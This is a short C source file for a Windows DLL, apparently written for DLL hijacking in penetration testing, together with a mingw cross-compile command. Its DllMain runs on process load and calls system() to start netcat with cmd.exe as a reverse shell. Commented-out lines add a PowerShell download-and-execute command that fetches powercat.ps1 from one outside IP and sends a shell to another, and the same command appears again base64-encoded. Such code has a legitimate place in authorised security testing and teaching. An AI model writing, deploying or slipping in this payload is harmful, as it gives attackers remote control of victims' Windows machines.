// cross-compile with 
// x86_64-w64-mingw32-gcc win-dll-reverse-shell.c --shared -o win-dll-reverse-shell.dll

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
        i = system ("C:\\services\\nc -v 127.0.0.1 5555 -e cmd.exe"); 
        // $Shell= "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.161/powercat.ps1');powercat -c 192.168.197.222 -p 5555-ep"
        // $Base64Shell = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Shell))
        //i = system ("powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMQA2ADEALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4AMQA5ADcALgAyADIAMgAgAC0AcAAgADUANQA1ADUAIAAtAGUAcAA= > C:\\services\\error.txt");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}